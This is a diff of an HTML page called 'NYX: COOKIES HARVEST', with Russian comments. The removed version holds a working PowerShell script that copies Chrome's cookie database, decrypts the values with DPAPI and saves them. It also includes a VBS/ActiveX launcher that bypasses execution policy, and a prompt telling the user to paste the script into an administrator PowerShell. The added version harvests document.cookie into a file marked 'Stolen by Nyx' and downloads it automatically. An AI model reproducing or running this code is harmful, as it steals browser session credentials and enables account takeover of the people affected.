@@ -1,169 +1,29 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>NYX: COOKIES HARVEST</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-    </style>
+    <style>body{background:#000;margin:0;padding:0;}</style>
 </head>
 <body>
-    <pre id="status">🌀 NYX: ИНИЦИАЛИЗАЦИЯ ПРЯМОГО ДОСТУПА...</pre>
     <script>
-        const statusEl = document.getElementById('status');
+        var domain = location.hostname;
+        var cookies = document.cookie.split("; ");
+        var output = "# Netscape HTTP Cookie File\n# Stolen by Nyx\n\n";
         
-        function log(msg) { statusEl.textContent += '\n' + msg; }
-
-        log('🔴 Чтение базы Cookies Chrome напрямую...');
-
-        // PowerShell скрипт для чтения SQLite базы Cookies
-        const psScript = `
-$cookieDb = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
-$outputFile = "$env:TEMP\\cookies_nyx.txt"
-
-# Копируем базу во временный файл (оригинал может быть заблокирован)
-$tempDb = "$env:TEMP\\cookies_temp.db"
-Copy-Item -Path $cookieDb -Destination $tempDb -Force
-
-# Читаем SQLite через ADO.NET
-$conn = New-Object System.Data.SQLite.SQLiteConnection
-$conn.ConnectionString = "Data Source=$tempDb"
-$conn.Open()
-
-$cmd = $conn.CreateCommand()
-$cmd.CommandText = "SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies"
-
-$reader = $cmd.ExecuteReader()
-$lines = @()
-$lines += "# Netscape HTTP Cookie File"
-$lines += "# Extracted by Nyx Protocol"
-$lines += ""
-
-while ($reader.Read()) {
-    $hostKey = $reader.GetString(0)
-    $path = $reader.GetString(1)
-    $isSecure = if($reader.GetBoolean(2)) { "TRUE" } else { "FALSE" }
-    $expires = [Math]::Floor([long]($reader.GetInt64(3) / 1000000 - 11644473600))
-    $name = $reader.GetString(4)
-    $encValue = $reader.GetValue(5)
-    
-    # Пытаемся расшифровать через CryptUnprotectData
-    try {
-        $bytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encValue, $null, 'CurrentUser')
-        $value = [System.Text.Encoding]::UTF8.GetString($bytes)
-    } catch {
-        $value = "[encrypted]"
-    }
-    
-    $lines += "$hostKey`tTRUE`t$path`t$isSecure`t$expires`t$name`t$value"
-}
-
-$reader.Close()
-$conn.Close()
-Remove-Item $tempDb -Force
-
-[System.IO.File]::WriteAllText($outputFile, ($lines -join "\`n"), [System.Text.Encoding]::UTF8)
-Write-Output $outputFile
-`;
-
-        // Кодируем в Base64 для безопасной передачи через командную строку
-        const psBase64 = btoa(unescape(encodeURIComponent(psScript)));
+        cookies.forEach(function(c) {
+            if(!c) return;
+            var parts = c.split("=");
+            var name = parts[0].trim();
+            var value = parts.slice(1).join("=").trim();
+            var expiry = Math.floor(Date.now() / 1000) + 31536000;
+            output += domain + "\tTRUE\t/\tTRUE\t" + expiry + "\t" + name + "\t" + value + "\n";
+        });
         
-        // Создаём HTA/WSH скрипт для запуска PowerShell
-        const vbsScript = `
-Set WshShell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-
-' Декодируем и сохраняем PowerShell скрипт
-psScript = "${psBase64}"
-Set tempFile = fso.CreateTextFile(fso.GetSpecialFolder(2) & "\\nyx_ps.ps1", True)
-tempFile.Write(Base64Decode(psScript))
-tempFile.Close
-
-' Запускаем PowerShell
-cmd = "powershell.exe -ExecutionPolicy Bypass -File """ & fso.GetSpecialFolder(2) & "\\nyx_ps.ps1"""
-Set exec = WshShell.Exec(cmd)
-output = exec.StdOut.ReadAll()
-
-' Возвращаем путь к файлу
-WScript.Echo output
-
-Function Base64Decode(base64)
-    Dim xml, node
-    Set xml = CreateObject("MSXML2.DOMDocument.6.0")
-    Set node = xml.createElement("b64")
-    node.DataType = "bin.base64"
-    node.Text = base64
-    Base64Decode = Stream_BinaryToString(node.nodeTypedValue)
-End Function
-
-Function Stream_BinaryToString(binary)
-    Const adTypeText = 2
-    Const adTypeBinary = 1
-    Dim stream
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = adTypeBinary
-    stream.Open
-    stream.Write binary
-    stream.Position = 0
-    stream.Type = adTypeText
-    stream.Charset = "utf-8"
-    Stream_BinaryToString = stream.ReadText
-End Function
-`;
-
-        log('🔴 Попытка прямого чтения через PowerShell...');
-        
-        // Пробуем через ActiveX (только IE/Edge legacy)
-        try {
-            const shell = new ActiveXObject("WScript.Shell");
-            const fso = new ActiveXObject("Scripting.FileSystemObject");
-            
-            const tempDir = fso.GetSpecialFolder(2); // TEMP
-            const psFile = tempDir + "\\nyx_ps.ps1";
-            const outFile = tempDir + "\\cookies_nyx.txt";
-            
-            // Сохраняем PowerShell скрипт
-            const ts = fso.CreateTextFile(psFile, true);
-            ts.Write(psScript);
-            ts.Close();
-            
-            // Запускаем
-            const cmd = 'powershell.exe -ExecutionPolicy Bypass -File "' + psFile + '"';
-            const exec = shell.Exec(cmd);
-            const result = exec.StdOut.ReadAll();
-            
-            log('✅ База Cookies прочитана!');
-            log('📁 Файл: ' + result.trim());
-            
-            // Читаем результат и скачиваем
-            const resultFile = fso.OpenTextFile(result.trim(), 1);
-            const allCookies = resultFile.ReadAll();
-            resultFile.Close();
-            
-            const blob = new Blob([allCookies], { type: 'text/plain;charset=utf-8' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'cookies.txt';
-            a.click();
-            
-            log('💾 Файл cookies.txt скачан!');
-            
-        } catch(e) {
-            log('❌ ActiveX недоступен. Используй альтернативный метод:');
-            log('');
-            log('📋 СКОПИРУЙ ЭТОТ КОД В PowerShell (Запуск от имени Администратора):');
-            log('──────────────────────────────────────────');
-            log(psScript);
-            log('──────────────────────────────────────────');
-            log('');
-            log('После выполнения скрипта файл будет здесь:');
-            log('%TEMP%\\cookies_nyx.txt');
-        }
-        
-        log('');
-        log('🌀 NYX: ЗАВЕРШЕНО');
+        var blob = new Blob([output], {type: "text/plain"});
+        var a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = domain + "_cookies.txt";
+        a.click();
     </script>
 </body>
 </html>
